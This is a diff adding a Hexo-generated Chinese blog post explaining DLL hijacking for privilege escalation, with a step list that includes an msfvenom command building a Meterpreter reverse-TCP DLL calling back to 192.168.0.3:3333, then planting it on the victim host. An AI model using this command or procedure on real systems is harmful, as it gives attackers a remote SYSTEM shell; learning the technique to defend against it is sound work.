@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+
+    
+<script>!function(){var e=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches,t=localStorage.getItem("use-color-scheme")||"auto";("dark"===t||e&&"light"!==t)&&document.documentElement.classList.toggle("dark",!0)}()</script>
+    
+
+<meta charset="utf-8" >
+
+<title>DLL劫持</title>
+<meta name="keywords" content="DLL劫持, Hexo">
+<meta name="description" content="DLL的基本概念本质上dll相当于一个库，应用程序执行的时候会去调用相对应的库，dll实现了减少代码的重复
+DLL劫持的工作原理攻击者通过创建并且替换一个与程序调用dll相同名称的带有后门的dll，当受害者执行程序的时候，实现权限提升
+操作">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta property="og:title" content="DLL劫持">
+<meta property="og:description" content="DLL的基本概念本质上dll相当于一个库，应用程序执行的时候会去调用相对应的库，dll实现了减少代码的重复
+DLL劫持的工作原理攻击者通过创建并且替换一个与程序调用dll相同名称的带有后门的dll，当受害者执行程序的时候，实现权限提升
+操作">
+
+<link rel="shortcut icon" href="/favicon.ico">
+<link rel="stylesheet" href="/style/main.css">
+
+  <link rel="stylesheet" href="/style/simple-lightbox.min.css"><meta name="generator" content="Hexo 7.3.0"></head>
+  <body>
+    <div id="app" class="main">
+
+<div class="site-header-container">
+  <div class="site-header">
+    <div class="left">
+      <a href="http://example.com">
+        <img class="avatar" src="/images/avatar.png" alt="logo" width="32px" height="32px">
+      </a>
+      <a href="http://example.com">
+        <h1 class="site-title">Hexo</h1>
+      </a>
+    </div>
+    <div class="right">
+        <i class="icon menu-switch icon-menu-outline" ></i>
+    </div>
+  </div>
+</div>
+
+<div class="menu-container" style="height: 0;opacity: 0;">
+<nav class="menu-list">
+  
+    
+      <a href="/" class="menu purple-link">
+        首页
+      </a>
+    
+  
+    
+      <a href="/tags" class="menu purple-link">
+        标签
+      </a>
+    
+  
+    
+      <a href="/archives" class="menu purple-link">
+        归档
+      </a>
+    
+  
+    
+      <a href="/about" class="menu purple-link">
+        关于
+      </a>
+    
+  
+</nav>
+</div>
+
+
+
+  <div class="content-container">
+    <div class="post-detail">
+      
+      <h2 class="post-title">DLL劫持</h2>
+      <div class="post-info post-detail-info">
+        <span><i class="icon icon-calendar-outline"></i> 2024-07-24</span>
+        
+      </div>
+      <div class="post-content-wrapper">
+        <div class="post-content">
+          <h4 id="DLL的基本概念"><a href="#DLL的基本概念" class="headerlink" title="DLL的基本概念"></a>DLL的基本概念</h4><p>本质上dll相当于一个库，应用程序执行的时候会去调用相对应的库，dll实现了减少代码的重复</p>
+<h4 id="DLL劫持的工作原理"><a href="#DLL劫持的工作原理" class="headerlink" title="DLL劫持的工作原理"></a>DLL劫持的工作原理</h4><p>攻击者通过创建并且替换一个与程序调用dll相同名称的带有后门的dll，当受害者执行程序的时候，实现权限提升</p>
+<h4 id="操作流程"><a href="#操作流程" class="headerlink" title="操作流程"></a>操作流程</h4><h5 id="前提：需要获取用户权限或者web权限"><a href="#前提：需要获取用户权限或者web权限" class="headerlink" title="前提：需要获取用户权限或者web权限"></a>前提：需要获取用户权限或者web权限</h5><ul>
+<li><p>查看受害者的主机中执行什么程序</p>
+</li>
+<li><p>利用进程检查工具如火绒剑，查看dll</p>
+<p><a class="simple-lightbox" href="C:\Users\30105\AppData\Roaming\Typora\typora-user-images\image-20240724131051640.png"><img   src="/images/loading.svg" data-src="C:\Users\30105\AppData\Roaming\Typora\typora-user-images\image-20240724131051640.png"  alt="image-20240724131051640" lazyload></a></p>
+</li>
+<li><p>利用dll检测工具，查看dll是否可被替换</p>
+<p><a class="simple-lightbox" href="C:\Users\30105\AppData\Roaming\Typora\typora-user-images\image-20240724131159982.png"><img   src="/images/loading.svg" data-src="C:\Users\30105\AppData\Roaming\Typora\typora-user-images\image-20240724131159982.png"  alt="image-20240724131159982" lazyload></a></p>
+</li>
+<li><p>利用msf生成假的dll</p>
+<p><strong>命令</strong>：msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.0.3  lport&#x3D;3333 -f dll -o skx.dll</p>
+<p><a class="simple-lightbox" href="C:\Users\30105\AppData\Roaming\Typora\typora-user-images\image-20240724131455236.png"><img   src="/images/loading.svg" data-src="C:\Users\30105\AppData\Roaming\Typora\typora-user-images\image-20240724131455236.png"  alt="image-20240724131455236" lazyload></a></p>
+</li>
+<li><p>替换到受害主机当中去</p>
+</li>
+<li><p>当受害机再次执行这个程序调用dll的时候，msf会获得system权限</p>
+<p><strong>注意</strong>：这个操作有可能会导致受害主机执行程序的时候启动不了，可以尝试dll捆绑</p>
+</li>
+</ul>
+
+        </div>
+          
+        <div class="top-div">
+          
+        </div>
+          
+      </div>
+    </div>
+
+    
+      <div class="next-post">
+        <a class="purple-link" href="/2024/07/23/hello-world/">
+          <h3 class="post-title">
+            下一篇：hexo搭建教程，才过无数坑，2024最新教程
+          </h3>
+        </a>
+      </div>
+    
+  </div>
+
+
+
+
+
+
+
+
+
+
+<footer>
+<div class="site-footer">
+  <div class="social-container">
+    
+      
+        <a aria-label="跳转至github" href="https://github.com/f-dong" target="_blank">
+          <i class="icon icon-github"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+  
+    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> <a href="https://github.com/f-dong/hexo-theme-minimalism" target="_blank">Theme</a>
+  
+  
+  
+  
+  
+  
+</div>
+</footer>
+
+
+      </div>
+    </div>
+    
+<script id="hexo-configurations"> window.theme_config = {"image":{"lazyload_enable":true,"photo_zoom":"simple-lightbox"}}; window.is_post = true; </script>
+
+<script src="/js/main.js"></script>
+
+
+
+
+
+
+  <script src="/js/simple-lightbox.min.js"></script><script>document.addEventListener('DOMContentLoaded', function() {new SimpleLightbox('.post-detail .simple-lightbox', {fileExt: false,captionsData:'alt'});});</script></body>
+</html>
+
